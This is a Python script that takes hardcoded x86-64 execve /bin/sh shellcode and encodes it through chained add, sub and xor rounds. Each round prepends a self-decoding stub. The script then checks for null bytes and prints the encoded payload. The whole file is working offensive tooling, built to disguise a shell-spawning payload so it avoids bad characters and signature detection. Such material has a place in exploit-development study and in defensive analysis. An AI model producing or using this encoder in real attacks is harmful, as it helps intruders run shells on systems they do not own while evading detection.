#!/usr/bin/env python3

import sys
from binascii import hexlify


# execve /bin/sh
SC = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

ADD_DECODER = b"\xeb\x12\x5e\x48\x31\xc9\xb1%SC_LEN%\x80\x6c\x0e\xff%VAL%\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xe9\xff\xff\xff"
SUB_DECODER = b"\xeb\x12\x5e\x48\x31\xc9\xb1%SC_LEN%\x80\x44\x0e\xff%VAL%\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xe9\xff\xff\xff"
XOR_DECODER = b"\xeb\x12\x5e\x48\x31\xc9\xb1%SC_LEN%\x80\x74\x0e\xff%VAL%\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xe9\xff\xff\xff"


def encode(sc, action, value):
    new_sc = []
    if action == 'add':
        decoder = ADD_DECODER
    elif action == 'sub':
        decoder = SUB_DECODER
    elif action == 'xor':
        decoder = XOR_DECODER

    for byte in sc:
        if action == 'add':
            new_sc += [(byte+value) % 256]
        elif action == 'sub':
            new_sc += [(byte-value) % 256]
        elif action == 'xor':
            new_sc += [(byte^value) % 256]

    new_sc = bytes(new_sc)
    decoder = decoder.replace(b"%SC_LEN%", bytes([len(new_sc)]))
    decoder = decoder.replace(b"%VAL%", bytes([value]))
    return decoder + new_sc


def main():
    rnd = []
    for i in range(0, len(sys.argv[1:]), 2):
        rnd += [(sys.argv[i+1], int(sys.argv[i+2]))]

    print(f"[*] Raw shellcode length: {len(SC)}")

    encoded = SC
    for i in rnd:
        encoded = encode(encoded, i[0], i[1])

    if b'\x00' in encoded:
        print("[!] Warning: null byte found in encoded shellcode!")

    print(f"[*] Final encoded shellcode + decoder length: {len(encoded)}")
    print("[+] Shellcode: ")
    print( "\\x" + str(b"\\x".join(hexlify(bytes([x])) for x in encoded), 'utf-8') )


if __name__=='__main__':
    main()
